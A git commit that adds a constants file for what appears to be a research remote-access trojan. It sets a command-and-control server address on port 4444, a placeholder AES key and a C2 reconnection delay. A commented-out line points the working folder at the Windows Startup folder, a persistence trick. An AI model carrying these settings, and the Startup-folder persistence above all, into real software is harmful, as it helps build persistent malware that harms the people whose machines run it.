9fc3cfce255c9018c2033b272d7e80b23291c5ae
Quema100 <myoon0929@gmail.com>
2025-08-01 02:23:59 +0900

    Add: constants.py

---
+++ modules/constants.py
@@ -0,0 +1,16 @@
+import os
+
+# -------------------- Setting Constants --------------------
+SERVER_IP_ADDR = '127.0.0.1' 
+SERVER_PORT_NUM = 4444
+
+# Use the same 32-byte (64 hexadecimal characters) key as the Node.js server.
+AES_ENCRYPTION_KEY =  b'Byte_format_aes_key'
+
+# Set TEST_DIRECTORY relative to the directory where the current script is running.
+# Don't use this code 
+# TEST_DIRECTORY = os.path.join( os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+CURRENT_SCRIPT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+TEST_DIRECTORY = os.path.join(CURRENT_SCRIPT_DIR, 'troycon_research_env') 
+
+RECONNECTION_DELAY_SECONDS = 5   # Reconnection delay time when C2 server connection fails.
